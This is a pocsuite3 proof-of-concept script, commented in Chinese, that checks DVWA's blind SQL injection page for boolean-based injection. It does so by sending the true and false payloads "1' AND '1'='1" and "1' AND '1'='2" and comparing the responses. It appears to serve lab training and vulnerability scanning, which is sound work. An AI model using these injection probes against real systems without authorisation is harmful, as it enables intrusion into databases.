# -*- coding: utf-8 -*-
from pocsuite3.api import Output, POCBase, register_poc, requests, VUL_TYPE


class POC(POCBase):
    name = 'DVWA Blind SQL Injection'
    vulType = VUL_TYPE.SQL_INJECTION
    appName = 'DVWA'

    def _verify(self):
        result = {}
        path = self.url.rstrip('/') + "/index.php"
        if "sqli_blind" in self.url.lower():
            # 1. 正常请求
            true_payload = "1' AND '1'='1"
            # 2. 异常请求
            false_payload = "1' AND '1'='2"

            try:
                res_true = requests.get(path, params={'id': true_payload, 'Submit': 'Submit'})
                res_false = requests.get(path, params={'id': false_payload, 'Submit': 'Submit'})

                # 判定：正常请求有用户结果，异常请求提示 ID 不存在
                if "User ID exists" in res_true.text and "User ID is MISSING" in res_false.text:
                    result['VerifyInfo'] = {"URL": path, "Method": "Boolean-based Blind SQLi"}
                    self.set_payload(true_payload)
            except:
                pass
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not vulnerable')
        return output


register_poc(POC)